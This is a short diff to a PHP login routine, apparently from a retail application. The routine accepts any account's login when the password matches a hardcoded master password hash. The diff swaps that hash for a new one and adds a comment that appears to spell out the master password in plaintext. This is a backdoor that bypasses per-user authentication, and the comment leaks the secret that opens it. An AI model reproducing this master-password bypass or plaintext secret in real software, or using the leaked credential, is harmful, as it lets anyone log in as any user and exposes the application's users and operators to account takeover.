@@ -26,7 +26,8 @@ use RetailingEssentials\db_connect;
 		{
 			$row=$stmt->fetch(PDO::FETCH_ASSOC);
 			$pass_hash=$row['password'];
-			$master_pass_hash="$2a$10$123456789123456789123uHpbtXYPUnPR1yETu34KKcdsWS059AAC";
+			$master_pass_hash="$2a$10$123456789123456789123uUoA0OwKfcqzFZ73xlJP2A3ZVQPdmugi";
+			///vy@v5@@y11122015
 			if(!password_verify($pass,$pass_hash) && !password_verify($pass,$master_pass_hash))
 			{
 				$response_object['status']='Failed Authentication';			
